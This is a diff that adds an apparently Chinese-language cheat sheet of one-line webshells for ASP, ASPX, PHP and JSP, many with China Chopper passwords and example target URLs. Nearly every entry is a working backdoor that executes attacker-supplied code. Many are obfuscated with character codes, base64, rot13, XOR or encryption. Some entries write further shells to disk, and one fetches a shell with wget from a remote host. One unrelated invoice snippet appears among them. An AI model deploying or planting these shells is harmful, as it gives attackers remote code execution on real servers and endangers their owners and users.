@@ -1,0 +1,420 @@
+======================================================
+||                     ASP一句话                    ||
+======================================================
+
+----------------------------------------
+<%eval request(0)%>
+----------------------------------------
+<%
+<!-- caidao setting input:<O>sb=eval(request(0))</O>,connecting pass:0 -->
+re= request("sb")
+if re <>"" then
+execute re
+response.end
+end if
+%>
+----------------------------------------
+<%Eval(Request(chr(112))):Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 39 then:f.attributes = 39:end if%>
+----------------------------------------
+<%   
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+%>
+----------------------------------------
+<% 
+dim x1,x2 
+x1 = request("pass") 
+x2 = x1 
+eval x2 
+%>
+----------------------------------------
+<% 
+Function MorfiCoder(Code) 
+  MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf) 
+End Function 
+Execute MorfiCoder(")/*/z/*/(tseuqer lave") 
+%>
+Password: z
+----------------------------------------
+<%a=request("cmd")%><%eval a%>
+----------------------------------------
+<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("a"))%>
+----------------------------------------
+<%execute(request("xiaoma"))%>
+----------------------------------------
+1":eval request("a")'
+----------------------------------------
+"%><%eval request("a")%><%'" 
+----------------------------------------
+<%Y=request("x")%> <%execute(Y)%>
+----------------------------------------
+<%eval request("xiaoma")%>
+----------------------------------------
+┼癥污爠煥敵瑳∨≡┩愾  password: a
+----------------------------------------
+======================================================
+||                     ASPX一句话                   ||
+======================================================
+----------------------------------------
+<%@Page Language=JS%><%eval(Request.Item(0),"unsafe");%>
+----------------------------------------
+<%@ Page Language = Jscript %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>
+----------------------------------------
+<% @Page Language="Jscript"%><%eval(Request.Item["hucxsz"],"unsafe");%>
+----------------------------------------
+<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>
+----------------------------------------
+<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+----------------------------------------
+<script type="text/javascript" language="C#">// <![CDATA[
+ WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10"); // ]]></script>
+Password: webadmin
+----------------------------------------
+<script runat="server" language="JScript"> 
+   function popup(str) { 
+  var q = "u"; 
+  var w = "afe"; 
+  var a = q + "ns" + w; 
+  var b= eval(str,a); 
+  return(b); 
+   } 
+</script>
+----------------------------------------
+<% 
+popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0=")))); 
+%>
+Password: z
+----------------------------------------
+<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["xiaoma"],"unsafe"));%>
+----------------------------------------
+<%@ Page Language="C#" ValidateRequest="false" %>
+<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["f4ck"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
+----------------------------------------
+2015-05-07
+<script runat="server" language="JScript">
+function exs(str) {
+  var q = "u";
+  var w = "afe";
+  var a = q + "ns" + w;
+  var b= /*///*/eval(str,a);
+  return(b);
+   }
+function dec(str,key) {
+  var k,q,t;
+  var s="";
+  var p="";
+  for(k = 0; k < str.length; k=k+2)
+  {
+    t = ((k+2)/2) % key.length;
+    p = key.substr(t, 1);
+    if (isFinite(str.substr(k, 1)))
+    {
+      q = "0x"+ str.substr(k, 2);
+      s = s + char(int(q)-p);// + "|" + p +"|";
+    }
+    else
+    {
+      q = "0x"+ str.substr(k, 4);
+      s = s + char(int(q)-p);
+      k = k+2;
+    }
+  }
+  return(s);
+   }
+</script>
+<%
+exs(exs(dec("556675766874782F4C75696E5E237E2360","1314")));
+%>
+密码z
+======================================================
+||                     PHP一句话                    ||
+======================================================
+
+----------------------------------------
+<?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>
+pass:1
+----------------------------------------
+<?=eval($_POST[0]);?> 
+----------------------------------------
+<?
+@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
+$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
+$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
+$_=$ 
+$_[$__  $__] ;$_[@-_]($_[@! _] );
+?>
+访问http://target.com/shell.php?0=system&1=ls
+----------------------------------------
+<?php
+$_="{"; 
+$_=($_^"<").($_^">;").($_^"/");
+?>
+<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+访问http://target.com/shell.php?_=system&__=ls
+----------------------------------------
+<?php
+echo preg_filter('|.*|e', $_REQUEST['pass'], '');
+?>
+----------------------------------------
+<?php
+mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');
+?>
+----------------------------------------
+
+----------------------------------------
+<?php
+$config= trim($_POST['43cb006424cbf7b46dbca36c8ed79b69']);
+$info = string2array($config);
+/**
+* 将字符串转换为数组
+* @param  string  $data  字符串
+* @return  array  返回数组格式，如果，data为空，则返回空数组
+*/
+function string2array($data) {
+if($data == '') return array();
+@eval("\$array = $data;");
+return $array;
+}
+?>
+菜刀: http://localhost/test.php 密码:cmd
+配置: <0>43cb006424cbf7b46dbca36c8ed79b69=eval($_POST['cmd'])</0>
+----------------------------------------
+<script language="php">@fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));</script>
+----------------------------------------
+<?php fputs (fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"))?>
+----------------------------------------
+<?php @fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));?>
+//file:lost.php
+//pass:lostwolf
+----------------------------------------
+?JFIF 
+<?php @eval($_POST['caidao']);?>
+----------------------------------------
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>
+----------------------------------------
+<?php @preg_replace("//e",$_POST[x],"e");exit("|LO|"); ?>
+----------------------------------------
+<?php array_map("ass\x65rt",(array)$_REQUEST['test']);?>
+----------------------------------------
+<?php $item['wind'] = 'assert';$array[] = $item;$array[0]['wind']($_POST['whirlwind']);?>
+----------------------------------------
+<?php if(isset($_POST["f4ck"])){$a=strrev("edoced_46esab");eval($a($_POST[z0]));}?>
+----------------------------------------
+<?php if(md5($_GET['pass'])=='21232f297a57a5a743894a0e4a801fc3'){eval($_POST[console]);}else{die('fuck off!');}?>
+----------------------------------------
+<?php
+//Password: $ws->Run
+eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));
+?>
+----------------------------------------
+<?php
+	$fatezero	= "SABERBERSERKER(\$LANCERPCASTEROSTCASTERARCHERCASTER'faCASTERtASSASSINzCASTERASSASSINCASTERro'RIDER)GINTAMA";
+	$fatestaynight	= str_replace("CASTER", "", $fatezero);
+	$fatezero	= str_replace("LANCER", "_", $fatestaynight);
+	$fatestaynight	= str_replace("SABER", "ev", $fatezero);
+	$fatezero	= str_replace("BERSERKER", "al", $fatestaynight);
+	$fatestaynight	= str_replace("RIDER", "]", $fatezero);
+	$fatezero	= str_replace("GINTAMA", ";", $fatestaynight);
+	$fatestaynight	= str_replace("ARCHER", "[", $fatezero);
+	$fatezero	= str_replace("ASSASSIN", "e", $fatestaynight);
+
+	if($fatestaynight !== $fatezero)
+	{
+		eval($fatezero);//fatezero
+	}
+?> 
+----------------------------------------
+<?php
+//http://test.com/get_write.php?a=/shell.php&b=3C3F70687020406576616C28245F504F53545B2763616964616F275D293B3F3E
+//caidao connecting http://test.com/shell.php	pass:caidao
+$p=realpath(dirname(__FILE__)."/").$_GET["a"];
+$t=$_GET["b"];
+$tt="";
+for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2));
+@fwrite(fopen($p,"w"),$tt);
+echo "success!";
+?>
+----------------------------------------
+<?php $s=@$_GET[2];if(md5($s.$s)=="e67c2597ecad64bb4cdad6633b04107f")@eval($_REQUEST[$s]); ?>
+----------------------------------------
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['k8']);?>
+----------------------------------------
+<?php ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>
+----------------------------------------
+<?php $mujj = $_POST['z'];if ($mujj!=""){$xsser=base64_decode($_POST['z0']);@eval("\$safedg = $xsser;");}?>
+----------------------------------------
+<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
+----------------------------------------
+<?php preg_replace("/^/e",base64_decode($_REQUEST[g]),0);?>
+----------------------------------------
+<?php fputs(fopen("./shell.php","w"),"<?eval(\$_POST[a]);?>")?>
+----------------------------------------
+<?php if($_POST[admin]){assert($_POST[admin]);}else{phpinfo();}?>
+----------------------------------------
+<?php ($www= $_POST['ice']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)','add');?>
+----------------------------------------
+<?php ($_=@$_GET[2]).@$_($_POST[1])?>
+caidao: http://site/1.php?2=assert Password: 1
+----------------------------------------
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>
+----------------------------------------
+<?php
+include('NubeFactura.php');//para HTTP
+$obj = new NubeFactura();
+$res= $obj->insertarFacturas();
+//print_r($res);
+//echo $res['NUM_NOF'];
+//echo $res['RazonSocial'];
+?>
+----------------------------------------
+<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>
+Password: 1
+----------------------------------------
+<?php
+$a[1] = 'a';
+$a[2] = 's';
+$a[3] = 's';
+$a[4] = 'e';
+$a[5] = 'r';
+$a[6] = 't';
+$i = 0;
+$n = 6;
+while ($i <= $n)
+{
+  $t =$t.$a[$i];
+  $i =$i+1;
+}
+$t($_POST[sb]);
+?>
+----------------------------------------
+<?
+$__C_C="WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09";
+$__P_P="abcdefghijklmnopqrstuvwxyz";
+$__X_X="123456789";
+$__O_O=$__X_X[5].$__X_X[3]."_";
+$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];
+$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];
+$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];
+$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];
+$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];
+$_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");');
+@$_[00]($__H_H($__H_H($__C_C)));
+?>
+----------------------------------------
+<?php
+error_reporting(0);
+session_start();
+header("Content-type:text/html;charset=utf-8");
+if(empty($_SESSION['api']))													$_SESSION['api']=substr(file_get_contents(sprintf('%s?%s',pack("H*",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067'),uniqid())),3649);
+@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);
+?>
+----------------------------------------
+<?php
+$x=~Ÿ¬¬º­«;
+$x($_POST[~¹¹ÏÏÏÏ]);
+?>
+Password: FF0000
+----------------------------------------
+<?php
+$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$hh("/[discuz]/e",$_POST['h'],"Access");
+?>
+----------------------------------------
+<?php
+$user="63a9f0ea7bb98050796b649e85481845"; #root
+$pass="7b24afc8bc80e548d66c4e7ff72171c5"; #toor
+
+if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)
+{eval($_GET['idc']);}
+?>
+---------------------------------------
+<?php
+    $func = new ReflectionFunction($_GET[m]);
+    echo $func->invokeArgs(array($_GET[c],$_GET[id]));
+?>
+shell.php?m=file_put_contents&c=test.php&id=<?@eval($_POST[c]);?> //写入一句话马 for linux
+shell.php?m=file_put_contents&c=test.php&id=<?php eval($_POST[c]);?> //写入一句话马 for windows
+shell.php?m=system&c=echo ^<?php eval^($_POST[c]^);?^> >test.php //在当前目录下面生成一句话马 for windows
+shell.php?m=system&c=wget http://xxx.xxx/igenus/images/suffix/test.php //当前目录下载一句话马 for linux
+----------------------------------------
+<?php assert($_POST[sb]);?>
+----------------------------------------
+<script language="php">@eval($_POST[sb])</script>
+caidao: <O>h=@eval($_POST1);</O>  Password: sb
+----------------------------------------
+<?php eval($_POST[xiaoma]);?>
+----------------------------------------
+<?php $_GET['ts7']($_POST['cmd']);?>
+//caidao: http://www.target.com/shell.php?ts7=assert
+----------------------------------------
+<?php
+@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
+@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
+@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // Password: -7
+?>
+----------------------------------------
+<?fputs(fopen("test.php","w"),'<?php eval($_POST["cmd"]);?>');?>
+----------------------------------------
+<?php
+error_reporting(0);
+set_time_limit(0);
+function decrypt($ciphertext_hex,$key){
+$key=md5($key);
+$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+$ciphertext_dec = pack("H*",$ciphertext_hex);
+$iv_dec = substr($ciphertext_dec, 0, $iv_size);
+$ciphertext_dec = substr($ciphertext_dec, $iv_size);
+$plaintext_dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec);
+return trim($plaintext_dec);
+}
+if(@$_REQUEST['key']){
+$key=$_REQUEST['key'];
+$hash='bd40dd58f44adc5c334e53418ea1bcd591521d60662c6753b89dc46bb02b1ecb02bf857eaa0ea5d5a36ecf638d65c55eb9a8f2b17ceb2d740e3eba7792d3995b7d4fdbdf9f5f90b219cf955539b169a40109ff496262cbc21050e6993d1f9a6a678990e0b01a03617dd4b38358d78e9a67eabe8b288487a96ca55a94e8d6614a';
+$shellcode='12ec445a8c4be78007d08367455c60d571c3509ba62d1f2b321fa824667345ff3131b02b81c8ad646ffc3360e60d19d3f7f43b7b21f5bca05d6e7abfc2461b5d72fffb22659aa08655cdd8734baa0fd47b93a5659348954f853d3a68022fb3422a3832efa04792c1a81680e5aa8081716f169e05afb332a26fbd0f76ae8905b9a068ddb54f3ae107ba673362835951f4953db1079b6a3c0b4eb20ca96a241936244947ee67e0d563d8b2eee439cc5ba21151ae520eec0a663f092f9845918c7d6630764dad77808e376e099008403b01c491399da5cb3c8926c29b1bf89e8c751fb33a850c608b20e4c41cf28ec8b8060a30a827b43cd301d9c587863ce39f2326345a0217110fc898acb6c3343f3ce8';
+eval(decrypt($hash,$key));
+}else{
+echo 'ERROR!';
+}
+//caidao:  <0>key=90sec</0>  or  Url: http://www.target.com/90sec.php?key=90sec   Password: shell
+----------------------------------------
+<?php
+function getMd5($md5 = null) {
+    $key = substr(md5($md5),26);
+    return $key; }
+    $array = array(
+      chr(112).chr(97).chr(115).chr(115),
+      chr(99).chr(104).chr(101).chr(99).chr(107),
+      chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)
+    );
+    if ( isset($_POST) ) $request = &$_POST;
+    elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
+    if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) {
+      if ( getMd5($request[$array[0]]) == $array[2] ) {
+        $token = preg_replace (
+        chr(47) . $array[2] . chr(47) . chr(101),
+        $request[$array[1]],
+        $array[2]
+      );
+    }
+}
+?>
+----------------------------------------
+<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['hkwwj']);?>
+----------------------------------------
+<?php
+$qajd2="VDFOVVd5";$vvnr1="UUdWMllX";$hitq5="d29KRjlR";$itfh2="ZGtabmg2Y1RRblhTazc=";// dfxzq4
+$akmi4 = str_replace("eu2","","eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce");// ulgp9
+$hygg4 = $akmi4("so0", "", "so0baso0sso0e6so04so0_so0dso0eso0cso0oso0dso0e");// qbhm1
+$gzsw5 = $akmi4("qik6","","qik6cqik6reqik6atqik6eqik6_fqik6uncqik6tqik6ioqik6n");// kfcs6
+$foxl6 = $gzsw5('', $hygg4($hygg4($akmi4("$;*,.", "", $vvnr1.$hitq5.$qajd2.$itfh2)))); $foxl6();
+?>
+----------------------------------------
+======================================================
+||                     JSP一句话                    ||
+======================================================
+----------------------------------------
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+----------------------------------------
